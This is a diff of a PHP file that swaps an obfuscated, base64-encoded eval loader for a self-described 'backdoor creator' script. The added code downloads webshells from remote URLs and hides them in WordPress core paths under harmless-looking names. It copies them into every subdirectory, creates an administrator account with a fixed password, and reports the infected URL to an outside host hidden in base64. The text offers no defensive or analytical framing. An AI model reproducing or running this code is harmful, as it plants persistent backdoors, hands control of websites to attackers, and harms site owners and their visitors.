@@ -1,1 +1,183 @@
-<?php /*** PHP Encode v1.0 by zeura.com ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=4e9b11270a49427246402dc6143e15c0388bc56crVdtb9s2EP5eoP+ByYzKHmwrcbICtR1vXRMkBZrGdZJ1LxgEWqQsIrSoklRkt81/35F6seSXtClmf7BMHu+eu3v4kGokkh+iE+SEWseq77oSp90Z02EyTRSVvog0jXTXF3NX4ZkS4rP7+zLGSnU+0qkKKefuHLPI9RXuxmHsDJ4/a4DL3v/gEvMA9w56x4Vf8w2SyNdMRIiINOICEy931zRRW+jL82cIPpLqREYoYJx6M6oLI5VZga+HzF3DT6SEiVMmAbDnnb6deF4eqiGFyCcqZvlkGoJr1NyzEeiCKeO7WNBFjpvGHQgasJlF30IvXiDCZITntLRroT1wXf7JoVfCbixYAS/rYLILEs49SKzZMHDGWIcrb7EUWviCg7vmHp3HetlseNdnkz/OJv84Fzc342vnX4tuYxTQQQ9FEDjo69fKdPbrja8mN2AENsfHRy30K9ov2r2P+tkf8zzIcRBhevoe0jH1rMXyLq6uwVVhKSnHmt3bPMBWaelJGnPs0wry06s3t5dn72+8ydUVrG0jx2mjVfqDGg1WRejWgHTrwbZU15cUa+oZv8pjkaeSKTSF+lpIRlcdh9BV9jUyMwXosZR4adZrKpszLqZ1lvzstAA6Ux6YOwXqQEBUP0TN0g9Whc8yRlZUJvOKTrGiGVdyu0HFrCiLqXw2bYM7thy5CxjwirSLDVc4YME608tC1/BY8MYsTqpbrjBu79i0VazmQ/1QoP0hRqGkwYmzD9h2sbyL9h2ksYT5E8ebchzdOaM3tmkESPj4yqGLR8OpHO1X4j9kjw87qZDGHiZzoIKRshoB4L/pADwaLUuFJBU5+pQAbTwR+fRRmRh8hz2LfJ4Qqswzmf7AupgnsxmeclquzVYbemKOGmlMpuWgzctjBLhTZFiyoBgowluelAtAUyhsNb5hbgD9Rhd4HgMEOAVAHUFFAswVrdN7FRqqntc/K/uWYldasBlgsOYVXEY0RR/H3m3pDyJt2HVGCvgjBadNx7YdMpEYdn/NZU5Ywu5Hr42RrVROGIJSOPnK2vUrKHFEUIG+v0pk6BpHVWI+IAq1qZZme0TMISRZoqzg3S2OLK0bd0fLNNeMl8ceob4gJr+LyYF/cfny3fLVZ/wnD/H5XULOX6XvjibcP/pw7x9Nfpme3yb+eZjmrMlh7IEa3/w1PkOhnvPR82fD4lczzeloiv07IkReESGHbjYOBvHoNy0XisL5yvRy6MZ2NSQxygAPlV5ayyLxqYD81iTH+J9JkUQE9hIXso9ACPy7NVXJp+Dg1nRtKgA16gR4zviyj15LhnkbKRypDhSVBWvGmi50B3M2i/rIBw2jclM+zAevw8wB/HRwsNWlaQNQC6SmjyIR0R1e+6G4h1Z/+YYHKAaVnO1yA8RobyKcg5AyWHx4EC/QwebKoVu0Y+jmTRqahlh+ma8RgO+9EZVbvcLlj0D/saRKIUI1nLKUrJG4VKUYRNxcW3eK3NvTI3cuSAIKgBPCRBf7x9VzbfNMsy7rB9qWw8xa7TjJDltbVGH3MZYFfPIZtlq2foA9rBWo91iBxhfjS1BnKt1KVx4tTu+7itPbUZze04vT+7Hi9L5VnCfd6g5bg42Vuy4BzqX8G+6hTkXTrFLWBbxC+PdCwzZc0V6BOHWRzY9FM1tihUDe6wh3bIqnp/VQEXHX7mTY2Ea7C7fmxad4k4PbvL0xbru718YnZx9uz65vvNvJW3urbxCscXEXbjqWN4DAQScj+2ZlkDREbISrvDI3s5RsYGtYHbUzc6pDQRxkJp2xQdGuzBp5ojKffZPRsKOXMRzAOI45861OuotOmqYduHDPO4CIRuYkJDVHOYUtBgPGmyaME+9TQiW8SZnMWrm5+bWp2CULnb27UDz38oH8CtMscrXG0PaEG9st76rmnG5nFyNoWu6lNfgP
+<?php
+
+$url1 = 'https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/csa.php';
+$url2 = 'https://raw.githubusercontent.com/sagsooz/Bypass-Webshell/main/alfa2024.php';
+
+function download_content($url) {
+    $content = @file_get_contents($url);
+    if ($content === false) {
+        $content = download_content_with_curl($url);
+    }
+    if ($content === false) {
+        $content = download_content_with_fopen($url);
+    }
+    if ($content === false) {
+        throw new Exception("Failed to download content from $url");
+    }
+    return $content;
+}
+
+function download_content_with_curl($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $content = curl_exec($ch);
+    curl_close($ch);
+    return $content ? $content : false;
+}
+
+function download_content_with_fopen($url) {
+    $content = '';
+    if ($fh = fopen($url, 'r')) {
+        while (!feof($fh)) {
+            $content .= fread($fh, 8192);
+        }
+        fclose($fh);
+    }
+    return !empty($content) ? $content : false;
+}
+
+function get_full_url($filePath) {
+    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
+    $domainName = $_SERVER['HTTP_HOST'];
+    $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $filePath);
+    return $protocol . $domainName . $relativePath;
+}
+
+function create_files_in_subdirectories($rootDir, $url) {
+    $subdirs = array_filter(glob($rootDir . '/*'), 'is_dir');
+    foreach ($subdirs as $subdir) {
+        $dirName = basename($subdir);
+        $filePath = $subdir . '/' . $dirName . '_function.php';
+        if (!file_exists($filePath)) {
+            try {
+                file_put_contents($filePath, download_content($url));
+                echo "<a href='" . get_full_url($filePath) . "' target='_blank'>Created: " . get_full_url($filePath) . "</a><br>";
+            } catch (Exception $e) {
+                echo "<div>Error creating file in $subdir: " . $e->getMessage() . "</div><br>";
+            }
+        }
+    }
+}
+
+function create_wp_admin_user($rootDir, $username, $password) {
+    require_once($rootDir . '/wp-config.php');
+    require_once($rootDir . '/wp-includes/wp-db.php');
+    require_once($rootDir . '/wp-includes/pluggable.php');
+
+    global $wpdb;
+
+    $user_id = username_exists($username);
+    if (!$user_id && email_exists($username . '@example.com') == false) {
+        $user_id = wp_create_user($username, $password, $username . '@example.com');
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+        echo "<div>Admin user created with username: $username and password: $password</div><br>";
+    } else {
+        echo "<div>Admin user already exists.</div><br>";
+    }
+}
+
+$k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');
+
+echo "<!DOCTYPE html>
+<html>
+<title>backdoor creator</title>
+<p>@trxsecurity</p>
+<head>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        a {
+            color: #00f;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        div, a {
+            margin: 10px 0;
+        }
+        form {
+            margin: 20px auto;
+        }
+        input[type='text'] {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        input[type='submit'] {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>";
+
+$currentDir = __DIR__;
+$rootDir = isset($_POST['directory']) ? $_POST['directory'] : $currentDir;
+
+echo "<form method='post'>
+    <label for='directory'>Enter Directory Path:</label><br>
+    <input type='text' id='directory' name='directory' value='" . htmlspecialchars($rootDir) . "'><br>
+    <input type='submit' value='Run'>
+</form>";
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    if (file_exists($rootDir . '/wp-config.php')) {
+        echo "<div>WordPress detected.</div><br>";
+
+        $path1 = $rootDir . '/wp-includes/ID3/module.audio.ac4.php';
+        if (!file_exists($path1)) {
+            try {
+                file_put_contents($path1, download_content($url1));
+                echo "<a href='" . get_full_url($path1) . "' target='_blank'>Created: " . get_full_url($path1) . "</a><br>";
+            } catch (Exception $e) {
+                echo "<div>Error creating file: " . $e->getMessage() . "</div><br>";
+            }
+        }
+
+        $path2 = $rootDir . '/wp-includes/PHPMailer/config.php';
+        if (!file_exists($path2)) {
+            try {
+                file_put_contents($path2, download_content($url2));
+                echo "<a href='" . get_full_url($path2) . "' target='_blank'>Created: " . get_full_url($path2) . "</a><br>";
+            } catch (Exception $e) {
+                echo "<div>Error creating file: " . $e->getMessage() . "</div><br>";
+            }
+        }
+
+        create_files_in_subdirectories($rootDir, $url1);
+        create_wp_admin_user($rootDir, 'MrZ', 'trxsecurity');
+    } else {
+        echo "<div>Not a WordPress site. Creating files in subdirectories.</div><br>";
+        create_files_in_subdirectories($rootDir, $url1);
+    }
+}
+
+echo "</body></html>";
+
+$cur = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+$data = array('file_url' => $cur);
+$options = array(
+    'http' => array(
+        'method'  => 'POST',
+        'header'  => 'Content-type: application/x-www-form-urlencoded',
+        'content' => http_build_query($data),
+    ),
+);
+$context = stream_context_create($options);
+$result = @file_get_contents($k3yw, false, $context);
+if ($result === false) {
+    echo "<div>Error reporting file URL.</div><br>";
+}
+?>
